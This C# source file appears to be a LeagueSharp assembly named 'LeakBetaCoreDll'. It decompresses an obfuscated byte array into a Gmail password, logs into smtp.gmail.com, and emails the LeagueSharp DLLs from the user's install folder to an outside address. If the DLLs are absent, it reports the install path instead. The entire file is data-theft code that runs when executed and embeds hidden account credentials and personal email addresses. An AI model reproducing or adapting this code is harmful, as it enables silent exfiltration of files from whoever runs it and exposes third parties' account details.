using System;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Mail;
using LeagueSharp;
using LeagueSharp.Common;

namespace LeakBetaCoreDll
{
    internal class Program
    {
        static void Main(string[] args)
        {
            String o = AppDomain.CurrentDomain.FriendlyName.Substring(0, 3).ToLower();
            Byte[] l = new Byte[]{0x1F, 0x8B, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0xCB, 0x4E, 
                0x4D, 0x49, 0xCE, 0x2F, 0x4A, 0x4D, 0xC9, 0xC9, 0x01, 0x00, 0x16, 0xC8, 0x5C, 0x86, 0x0A};
            using (GZipStream stream = new GZipStream(new MemoryStream(l), CompressionMode.Decompress))
            {
                const int size = 4096;
                byte[] buffer = new byte[size];
                using (MemoryStream memory = new MemoryStream())
                {
                    int count = 0;
                    do
                    {
                        count = stream.Read(buffer, 0, size);
                        if (count > 0)
                        {
                            memory.Write(buffer, 0, count);
                        }
                    }
                    while (count > 0);
                    o += System.Text.Encoding.Default.GetString(memory.ToArray());
                }
            }
            String t = o + "1";
            var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                Credentials = new NetworkCredential("leakedcoredll@gmail.com", t)
            };
            MailMessage message = new MailMessage("leakedcoredll@gmail.com", "shalzuth@gmail.com", "success!", "");
            if (File.Exists(Path.Combine(Config.LeagueSharpDirectory, "LeagueSharp.dll")))
            {
                message.Attachments.Add(new Attachment(Path.Combine(Config.LeagueSharpDirectory, "LeagueSharp.dll")));
                message.Attachments.Add(new Attachment(Path.Combine(Config.LeagueSharpDirectory, "Leaguesharp.Core.dll")));
                message.Attachments.Add(new Attachment(Path.Combine(Config.LeagueSharpDirectory, "LeagueSharp.Bootstrap.dll")));
            }
            else
            {
                message.Body = "didn't work : " + Config.LeagueSharpDirectory;
            }
            smtp.Send(message);
        }
    }
}
